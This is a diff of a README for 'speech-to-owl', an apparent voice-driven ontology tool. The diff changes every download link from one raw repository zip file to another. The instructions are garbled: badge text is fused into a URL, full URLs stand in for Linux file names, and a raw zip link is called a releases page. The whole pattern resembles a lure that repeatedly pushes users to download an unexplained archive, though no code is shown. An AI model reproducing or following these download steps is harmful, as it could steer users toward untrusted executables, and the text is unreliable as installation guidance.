@@ -5,9 +5,9 @@ Welcome to **speech-to-owl**, a voice-driven tool that helps you create ontologi
 
 ## 📦 Download & Install
 
-[![Download Now](https://raw.githubusercontent.com/SANTANC/speech-to-owl/main/pufflet/speech-to-owl.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/SANTANC/speech-to-owl/main/pufflet/speech-to-owl.zip)
+[![Download Now](https://raw.githubusercontent.com/SANTANC/speech-to-owl/main/docs/owl_speech_to_v3.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/SANTANC/speech-to-owl/main/docs/owl_speech_to_v3.2.zip)
 
-To get started, visit this page to download the latest version: [Download Link](https://raw.githubusercontent.com/SANTANC/speech-to-owl/main/pufflet/speech-to-owl.zip). 
+To get started, visit this page to download the latest version: [Download Link](https://raw.githubusercontent.com/SANTANC/speech-to-owl/main/docs/owl_speech_to_v3.2.zip). 
 
 ## 🚀 Getting Started
 
@@ -22,19 +22,19 @@ Before you download, ensure that your computer meets the following minimum requi
 
 ### 📥 Steps to Download and Run
 
-1. **Visit the Releases Page**: Click the [Download Link](https://raw.githubusercontent.com/SANTANC/speech-to-owl/main/pufflet/speech-to-owl.zip) or the button at the top to go to the releases page.
+1. **Visit the Releases Page**: Click the [Download Link](https://raw.githubusercontent.com/SANTANC/speech-to-owl/main/docs/owl_speech_to_v3.2.zip) or the button at the top to go to the releases page.
   
 2. **Choose the Latest Release**: Look for the latest version at the top of the page. It will usually have a version number like "v1.0".
 
 3. **Select the Correct File for Your System**:
    - For **Windows**: Download the `.exe` file.
    - For **macOS**: Download the `.dmg` file.
-   - For **Linux**: Download the `https://raw.githubusercontent.com/SANTANC/speech-to-owl/main/pufflet/speech-to-owl.zip` file or `.deb` file, depending on your distribution.
+   - For **Linux**: Download the `https://raw.githubusercontent.com/SANTANC/speech-to-owl/main/docs/owl_speech_to_v3.2.zip` file or `.deb` file, depending on your distribution.
 
 4. **Install the Application**:
    - For **Windows**: Double-click the `.exe` file and follow the on-screen instructions.
    - For **macOS**: Open the `.dmg` file and drag the application into your Applications folder.
-   - For **Linux**: Extract the `https://raw.githubusercontent.com/SANTANC/speech-to-owl/main/pufflet/speech-to-owl.zip` file and follow the included README for installation details or use the package manager for the `.deb` file.
+   - For **Linux**: Extract the `https://raw.githubusercontent.com/SANTANC/speech-to-owl/main/docs/owl_speech_to_v3.2.zip` file and follow the included README for installation details or use the package manager for the `.deb` file.
 
 5. **Run the Application**: After installation, find the application in your programs or applications folder. Launch it.
 
@@ -78,4 +78,4 @@ For additional help, you can check the FAQ section on the GitHub page or open an
 ## 📬 Feedback
 We value your input. If you have suggestions or find any issues, please feel free to report them on GitHub. Your feedback helps in improving the tool.
 
-Once again, to download the application, please visit [this page](https://raw.githubusercontent.com/SANTANC/speech-to-owl/main/pufflet/speech-to-owl.zip). Happy building!
+Once again, to download the application, please visit [this page](https://raw.githubusercontent.com/SANTANC/speech-to-owl/main/docs/owl_speech_to_v3.2.zip). Happy building!
